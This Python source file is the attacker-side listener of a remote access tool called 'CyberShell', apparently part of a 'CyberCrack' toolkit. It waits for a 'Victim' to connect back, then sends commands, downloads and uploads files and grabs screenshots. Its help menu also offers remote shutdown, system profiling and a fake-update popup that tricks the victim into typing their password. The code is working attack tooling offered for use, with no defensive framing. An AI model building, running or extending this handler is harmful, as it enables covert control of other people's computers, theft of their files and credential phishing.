import socket
import time
import base64
from pprint import pprint
from colorama import *
init()
red = Fore.RED
reset = Fore.RESET
def shell():
    def options():
        print(r"""
          Options                      Usage                   optional/neccesary
    :   LHOST                 | LHOST (yourip)           |          neccesary
    :   LPORT                 | LPORT (Listner port)     |          neccesary
    :   exploit/run           | exploit or run           |          neccesary 
    :   ExitOnSession         | ExitOnSession True/False |          neccesary
    :   Main()                | Main() exit this module  |          optional

        """)

    def CyberShel():
        print(r"""
           Command                          Usage                                                            special/not
    :   Download                | Download a file from target |                                                Special
    :   Upload                  | Upload a file from ur machine to target|                                     Special
    :   Shutdown                | Shutdown the target system (CyberShell will also die) |                      Special
    :   Restart                 | Restart the target system (CyberShell will also die)  |                      Special
    :   Exit.session            | Exit the session |                                                           Not
    :   ChangeDir               | Change the current directory to the directory of your choice |               Special
    :   Session.help            | Show help message |                                                          Not
    :   alert content           | Pops an alert on target |                                                    Special
    :   SysInfo                 | Show all the info about the target system |                                  Special
    :   get_system_password     | Pops up an alert, must install updates give your password to install them |  Special
    :   desktop_snap            | Take a screenshot and send it to you |                                       Not
        """)

    while True:
        try:
            CybershellInput = input("CyberCrack: windows/CyberShell/rev_tcp > ")
            lhoststr = "LHOST "
            lportstr = "LPORT "
            if CybershellInput == "Options.module" or CybershellInput == "options.module":
                options()
            elif CybershellInput == "Options.session" or CybershellInput == "options.session":
                CyberShel()
            elif lhoststr in CybershellInput:
                ipforshell = CybershellInput.replace(lhoststr, '')
                LHOST = str(ipforshell)
                print("LHOST = " + LHOST)
            elif lportstr in CybershellInput:
                portforshell = CybershellInput.replace(lportstr, '')
                LPORT = int(portforshell)
                print("LPORT = " + str(LPORT))
            elif CybershellInput == "Sys.crash":
                print("hello")
            elif CybershellInput == "Main()":
                break
            elif CybershellInput == "help" or CybershellInput == "show options":
                print(r"""
: Options.module                   Show you the parameters for the module
: Options.session                  Show you options for the CyberShell
                """)
            elif CybershellInput == "Exploit" or CybershellInput == "run" or CybershellInput == "exploit":
                try:
                    while True:
                        try:
                            import socket
                            import pickle
                            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            listener.bind((LHOST, LPORT))
                            listener.listen(0)
                            print(Fore.BLUE + "[+] " + Fore.RESET + "Started to listen on " + LHOST + ":" + str(
                                LPORT))
                            connection, addr = listener.accept()
                            print(Fore.BLUE + "[+] " + Fore.RESET + "Victim connected")

                            def write_file(path, content):
                                with open(path, "wb") as file:
                                    file.write(content)
                                    print("[+] Download Successful")

                            def read_file(file):
                                with open(file, "rb") as to_upload:
                                    content = to_upload.read()
                                connection.send(content)

                            def reliable_recv():
                                result = connection.recv(1048576)
                                result = result.decode()
                                print(result)

                            def reliable_send(data):
                                command = data.encode()
                                connection.send(command)

                            try:
                                while True:
                                    command = input("CyberShell > ")
                                    if command.lower() == "session.help" or command.lower() == "help":
                                        CyberShel()
                                    elif command.startswith("Download"):
                                        name = command.split()[1]
                                        reliable_send(data=command)
                                        result = connection.recv(1048576)
                                        content = result
                                        write_file(name, content=content)
                                    elif "Upload " in command:
                                        file = command.replace("Upload ", "")
                                        reliable_send(data=command)
                                        read_file(file=file)
                                        message = connection.recv(1024)
                                        print(message.decode())
                                    elif command == "":
                                        continue
                                    elif command == "desktop_snap":
                                        reliable_send(command)
                                        with open("screenshot.png", "wb")as screenshot:
                                            screenshot.write(connection.recv(1048576))
                                            print("[+] Done")
                                    else:
                                        reliable_send(data=command)
                                        reliable_recv()
                            except KeyboardInterrupt:
                                break
                        except KeyboardInterrupt:
                            print(Fore.RED)
                            print("KeyBoardInterrupt")
                            print(Fore.RESET)
                            quit()
                except socket.error as error:
                    print(red)
                    print("A session couldn't be made because the following reason ")
                    print("Try Giving a correct, available ip and port for the listner to work")
                    print("The error is the following")
                    print(error)
                    print(reset)
            else:
                print(red)
                print("Invalid Syntax")
                print(reset)
        except KeyboardInterrupt:
            break
        except UnboundLocalError:
            print("[+] Assign required fields. type module.help for more info")
